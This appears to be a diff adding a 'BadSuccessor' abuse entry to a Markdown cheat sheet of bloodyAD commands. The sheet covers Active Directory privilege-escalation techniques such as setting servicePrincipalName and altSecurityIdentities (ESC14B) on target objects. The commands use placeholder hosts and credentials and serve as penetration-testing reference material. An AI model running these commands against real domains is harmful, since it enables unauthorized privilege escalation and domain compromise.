@@ -80,6 +80,11 @@ bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set object <targe
 bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set object <target>servicePrincipalName -v '<domain/meow>'
 ```
 
+## Abuse BadSuccessor
+```
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add badSuccessor dmsa
+```
+
 ## ESC14B - Modify the altSecurityIdentities attribute
 ```
 bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set object <target_user> altSecurityIdentities -v 'X509:<RFC822>pain@meow.local'
